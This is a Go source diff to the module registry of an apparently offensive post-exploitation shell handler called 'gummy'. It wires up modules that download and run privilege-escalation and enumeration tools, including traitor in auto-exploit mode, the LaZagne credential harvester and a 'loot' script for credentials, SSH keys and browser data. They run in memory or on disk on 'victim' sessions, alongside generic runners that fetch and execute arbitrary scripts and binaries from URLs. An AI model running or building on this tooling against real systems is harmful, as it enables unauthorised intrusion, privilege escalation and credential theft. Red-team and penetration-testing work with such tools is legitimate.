@@ -9,9 +9,9 @@ import (
 // Module interface for all gummy modules
 type Module interface {
 	Name() string        // Module identifier (e.g., "peas", "lse", "sh")
-	Category() string    // Category (e.g., "Linux", "Windows", "Misc", "Custom")
+	Category() string    // Category (e.g., "linux", "windows", "custom")
 	Description() string // Short description
-	ExecutionMode() string // "memory", "disk-cleanup", "disk-no-cleanup"
+	ExecutionMode() string // "memory", "disk-cleanup"
 	Run(ctx context.Context, session *SessionInfo, args []string) error
 }
 
@@ -26,16 +26,17 @@ var globalRegistry *ModuleRegistry
 func GetModuleRegistry() *ModuleRegistry {
 	if globalRegistry == nil {
 		globalRegistry = NewModuleRegistry()
-		// Register built-in modules
+		// Linux modules
 		globalRegistry.Register(&PEASModule{})
 		globalRegistry.Register(&LSEModule{})
 		globalRegistry.Register(&LootModule{})
 		globalRegistry.Register(&PSPYModule{})
+		globalRegistry.Register(&TraitorModule{})
+		// Windows modules
 		globalRegistry.Register(&WinPEASModule{})
-		globalRegistry.Register(&PowerUpModule{})
-		globalRegistry.Register(&PowerViewModule{})
+		globalRegistry.Register(&SeatbeltModule{})
 		globalRegistry.Register(&LaZagneModule{})
-		globalRegistry.Register(&PrivescModule{})
+		// Custom modules (generic runners)
 		globalRegistry.Register(&BinaryModule{})
 		globalRegistry.Register(&ShellScriptModule{})
 		globalRegistry.Register(&PowerShellScriptModule{})
@@ -98,41 +99,22 @@ func (r *ModuleRegistry) ListByCategory() map[string][]Module {
 }
 
 // ============================================================================
-// Module URLs (from Penelope)
+// Module URLs
 // ============================================================================
 
 const (
 	// Linux
 	URL_LINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
 	URL_LSE     = "https://github.com/chsoares/linux-smart-enumeration/raw/refs/heads/master/lse.sh"
-	URL_DEEPCE  = "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh"
 	URL_LOOT    = "https://github.com/chsoares/ezpz/raw/refs/heads/main/utils/loot.sh"
 	URL_PSPY64  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
-	URL_PSPY32  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32"
+	URL_TRAITOR = "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64"
 
 	// Windows
-	URL_WINPEAS      = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
-	URL_POWERUP      = "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
-	URL_LAZAGNE      = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
-	URL_SHARPUP      = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe"
-	URL_POWERVIEW    = "https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1"
+	URL_WINPEAS  = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
+	URL_SEATBELT = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
+	URL_LAZAGNE  = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
 )
-
-// Script lists for privesc module
-var linuxPrivescScripts = []string{
-	URL_LINPEAS,
-	URL_LSE,
-	URL_DEEPCE,
-	URL_PSPY64,
-}
-
-var windowsPrivescScripts = []string{
-	URL_WINPEAS,
-	URL_POWERUP,
-	URL_LAZAGNE,
-	URL_SHARPUP,
-	URL_POWERVIEW,
-}
 
 // ============================================================================
 // Linux Modules
@@ -141,9 +123,9 @@ var windowsPrivescScripts = []string{
 // PEASModule - LinPEAS privilege escalation scanner
 type PEASModule struct{}
 
-func (m *PEASModule) Name() string        { return "peas" }
-func (m *PEASModule) Category() string    { return "linux" }
-func (m *PEASModule) Description() string { return "Run LinPEAS privilege escalation scanner" }
+func (m *PEASModule) Name() string          { return "peas" }
+func (m *PEASModule) Category() string      { return "linux" }
+func (m *PEASModule) Description() string   { return "Run LinPEAS privilege escalation scanner" }
 func (m *PEASModule) ExecutionMode() string { return "memory" }
 
 func (m *PEASModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
@@ -153,13 +135,12 @@ func (m *PEASModule) Run(ctx context.Context, session *SessionInfo, args []strin
 // LSEModule - Linux Smart Enumeration
 type LSEModule struct{}
 
-func (m *LSEModule) Name() string        { return "lse" }
-func (m *LSEModule) Category() string    { return "linux" }
-func (m *LSEModule) Description() string { return "Run Linux Smart Enumeration" }
+func (m *LSEModule) Name() string          { return "lse" }
+func (m *LSEModule) Category() string      { return "linux" }
+func (m *LSEModule) Description() string   { return "Run Linux Smart Enumeration" }
 func (m *LSEModule) ExecutionMode() string { return "memory" }
 
 func (m *LSEModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
-	// Default to -l1 if no args provided
 	if len(args) == 0 {
 		args = []string{"-l1"}
 	}
@@ -169,26 +150,40 @@ func (m *LSEModule) Run(ctx context.Context, session *SessionInfo, args []string
 // PSPYModule - Monitor processes without root (pspy64)
 type PSPYModule struct{}
 
-func (m *PSPYModule) Name() string        { return "pspy" }
-func (m *PSPYModule) Category() string    { return "linux" }
-func (m *PSPYModule) Description() string { return "Run pspy process monitor" }
+func (m *PSPYModule) Name() string          { return "pspy" }
+func (m *PSPYModule) Category() string      { return "linux" }
+func (m *PSPYModule) Description() string   { return "Run pspy process monitor" }
 func (m *PSPYModule) ExecutionMode() string { return "disk-cleanup" }
 
 func (m *PSPYModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
-	// Default to pspy64, but could add detection for 32-bit systems
 	return session.RunBinary(ctx, URL_PSPY64, args)
 }
 
 // LootModule - ezpz post-exploitation script (credentials, SSH keys, browser data)
 type LootModule struct{}
 
-func (m *LootModule) Name() string        { return "loot" }
-func (m *LootModule) Category() string    { return "linux" }
-func (m *LootModule) Description() string { return "Run ezpz post-exploitation script" }
+func (m *LootModule) Name() string          { return "loot" }
+func (m *LootModule) Category() string      { return "linux" }
+func (m *LootModule) Description() string   { return "Run ezpz post-exploitation script" }
 func (m *LootModule) ExecutionMode() string { return "memory" }
 
 func (m *LootModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	return session.RunScriptInMemory(ctx, URL_LOOT, args)
+}
+
+// TraitorModule - Auto privilege escalation for Linux
+type TraitorModule struct{}
+
+func (m *TraitorModule) Name() string          { return "traitor" }
+func (m *TraitorModule) Category() string      { return "linux" }
+func (m *TraitorModule) Description() string   { return "Run traitor auto privesc" }
+func (m *TraitorModule) ExecutionMode() string { return "disk-cleanup" }
+
+func (m *TraitorModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		args = []string{"-a"}
+	}
+	return session.RunBinary(ctx, URL_TRAITOR, args)
 }
 
 // ============================================================================
@@ -207,28 +202,19 @@ func (m *WinPEASModule) Run(ctx context.Context, session *SessionInfo, args []st
 	return session.RunDotNetInMemory(ctx, URL_WINPEAS, args)
 }
 
-// PowerUpModule - PowerUp privilege escalation checker (PowerShell, in-memory)
-type PowerUpModule struct{}
+// SeatbeltModule - Seatbelt system enumeration (.NET assembly, in-memory)
+type SeatbeltModule struct{}
 
-func (m *PowerUpModule) Name() string          { return "powerup" }
-func (m *PowerUpModule) Category() string      { return "windows" }
-func (m *PowerUpModule) Description() string   { return "Run PowerUp privilege escalation checker" }
-func (m *PowerUpModule) ExecutionMode() string { return "memory" }
+func (m *SeatbeltModule) Name() string          { return "seatbelt" }
+func (m *SeatbeltModule) Category() string      { return "windows" }
+func (m *SeatbeltModule) Description() string   { return "Run Seatbelt system enumeration" }
+func (m *SeatbeltModule) ExecutionMode() string { return "memory" }
 
-func (m *PowerUpModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
-	return session.RunPowerShellInMemory(ctx, URL_POWERUP, args)
-}
-
-// PowerViewModule - PowerView AD enumeration (PowerShell, in-memory)
-type PowerViewModule struct{}
-
-func (m *PowerViewModule) Name() string          { return "powerview" }
-func (m *PowerViewModule) Category() string      { return "windows" }
-func (m *PowerViewModule) Description() string   { return "Load PowerView AD enumeration functions" }
-func (m *PowerViewModule) ExecutionMode() string { return "memory" }
-
-func (m *PowerViewModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
-	return session.RunPowerShellInMemory(ctx, URL_POWERVIEW, args)
+func (m *SeatbeltModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		args = []string{"-group=all"}
+	}
+	return session.RunDotNetInMemory(ctx, URL_SEATBELT, args)
 }
 
 // LaZagneModule - LaZagne credential harvester (native binary, disk + cleanup)
@@ -247,78 +233,15 @@ func (m *LaZagneModule) Run(ctx context.Context, session *SessionInfo, args []st
 }
 
 // ============================================================================
-// Misc Modules
+// Custom Modules (generic runners)
 // ============================================================================
-
-// PrivescModule - Upload multiple privesc scripts at once
-type PrivescModule struct{}
-
-func (m *PrivescModule) Name() string        { return "privesc" }
-func (m *PrivescModule) Category() string    { return "misc" }
-func (m *PrivescModule) Description() string { return "Upload multiple privilege escalation scripts" }
-func (m *PrivescModule) ExecutionMode() string { return "disk-no-cleanup" }
-
-func (m *PrivescModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
-	var scripts []string
-
-	// Select scripts based on detected platform
-	switch session.Platform {
-	case "linux", "unix", "":
-		scripts = linuxPrivescScripts
-	case "windows":
-		scripts = windowsPrivescScripts
-	default:
-		scripts = linuxPrivescScripts // Default to Linux
-	}
-
-	// Upload each script using SmartUpload (HTTP if binbag enabled, b64 fallback)
-	for _, url := range scripts {
-		// Check for cancellation
-		if ctx.Err() == context.Canceled {
-			return fmt.Errorf("cancelled by user")
-		}
-
-		filename := getFilenameFromURL(url)
-
-		// Download locally to temp with unique name
-		localPath := fmt.Sprintf("/tmp/gummy_%s", filename)
-		if err := DownloadFile(ctx, url, localPath); err != nil {
-			if ctx.Err() == context.Canceled {
-				return fmt.Errorf("cancelled by user")
-			}
-			continue
-		}
-
-		// Upload to victim's CWD with original filename
-		t := NewTransferer(session.Conn, session.ID)
-		t.SetPlatform(session.Platform) // IMPORTANT: Set platform for correct upload method
-		if err := t.SmartUpload(ctx, localPath, filename); err != nil {
-			if ctx.Err() == context.Canceled {
-				return fmt.Errorf("cancelled by user")
-			}
-		}
-	}
-
-	return nil
-}
-
-// Helper to extract filename from URL
-func getFilenameFromURL(url string) string {
-	// Simple extraction: get last part after /
-	for i := len(url) - 1; i >= 0; i-- {
-		if url[i] == '/' {
-			return url[i+1:]
-		}
-	}
-	return url
-}
 
 // BinaryModule - Run arbitrary binary from URL or binbag (disk + cleanup)
 type BinaryModule struct{}
 
-func (m *BinaryModule) Name() string        { return "bin" }
-func (m *BinaryModule) Category() string    { return "misc" }
-func (m *BinaryModule) Description() string { return "Run arbitrary binary (disk + cleanup)" }
+func (m *BinaryModule) Name() string          { return "bin" }
+func (m *BinaryModule) Category() string      { return "custom" }
+func (m *BinaryModule) Description() string   { return "Run arbitrary binary (disk + cleanup)" }
 func (m *BinaryModule) ExecutionMode() string { return "disk-cleanup" }
 
 func (m *BinaryModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
@@ -332,16 +255,12 @@ func (m *BinaryModule) Run(ctx context.Context, session *SessionInfo, args []str
 	return session.RunBinary(ctx, source, binaryArgs)
 }
 
-// ============================================================================
-// Custom Modules
-// ============================================================================
-
 // ShellScriptModule - Run arbitrary shell script from URL
 type ShellScriptModule struct{}
 
-func (m *ShellScriptModule) Name() string        { return "sh" }
-func (m *ShellScriptModule) Category() string    { return "custom" }
-func (m *ShellScriptModule) Description() string { return "Run arbitrary bash script from URL" }
+func (m *ShellScriptModule) Name() string          { return "sh" }
+func (m *ShellScriptModule) Category() string      { return "custom" }
+func (m *ShellScriptModule) Description() string   { return "Run arbitrary bash script from URL" }
 func (m *ShellScriptModule) ExecutionMode() string { return "memory" }
 
 func (m *ShellScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
@@ -358,9 +277,9 @@ func (m *ShellScriptModule) Run(ctx context.Context, session *SessionInfo, args 
 // PowerShellScriptModule - Run arbitrary PowerShell script from URL
 type PowerShellScriptModule struct{}
 
-func (m *PowerShellScriptModule) Name() string        { return "ps1" }
-func (m *PowerShellScriptModule) Category() string    { return "custom" }
-func (m *PowerShellScriptModule) Description() string { return "Run arbitrary PowerShell script from URL" }
+func (m *PowerShellScriptModule) Name() string          { return "ps1" }
+func (m *PowerShellScriptModule) Category() string      { return "custom" }
+func (m *PowerShellScriptModule) Description() string   { return "Run arbitrary PowerShell script from URL" }
 func (m *PowerShellScriptModule) ExecutionMode() string { return "memory" }
 
 func (m *PowerShellScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
@@ -377,14 +296,14 @@ func (m *PowerShellScriptModule) Run(ctx context.Context, session *SessionInfo, 
 // DotNetAssemblyModule - Run arbitrary .NET assembly from URL
 type DotNetAssemblyModule struct{}
 
-func (m *DotNetAssemblyModule) Name() string        { return "net" }
-func (m *DotNetAssemblyModule) Category() string    { return "custom" }
-func (m *DotNetAssemblyModule) Description() string { return "Run arbitrary .NET assembly from URL" }
+func (m *DotNetAssemblyModule) Name() string          { return "dotnet" }
+func (m *DotNetAssemblyModule) Category() string      { return "custom" }
+func (m *DotNetAssemblyModule) Description() string   { return "Run arbitrary .NET assembly from URL" }
 func (m *DotNetAssemblyModule) ExecutionMode() string { return "memory" }
 
 func (m *DotNetAssemblyModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	if len(args) == 0 {
-		return fmt.Errorf("usage: run net <url> [assembly args...]")
+		return fmt.Errorf("usage: run dotnet <url> [assembly args...]")
 	}
 
 	url := args[0]
@@ -396,9 +315,9 @@ func (m *DotNetAssemblyModule) Run(ctx context.Context, session *SessionInfo, ar
 // PythonScriptModule - Run arbitrary Python script from URL
 type PythonScriptModule struct{}
 
-func (m *PythonScriptModule) Name() string        { return "py" }
-func (m *PythonScriptModule) Category() string    { return "custom" }
-func (m *PythonScriptModule) Description() string { return "Run arbitrary Python script from URL" }
+func (m *PythonScriptModule) Name() string          { return "py" }
+func (m *PythonScriptModule) Category() string      { return "custom" }
+func (m *PythonScriptModule) Description() string   { return "Run arbitrary Python script from URL" }
 func (m *PythonScriptModule) ExecutionMode() string { return "memory" }
 
 func (m *PythonScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
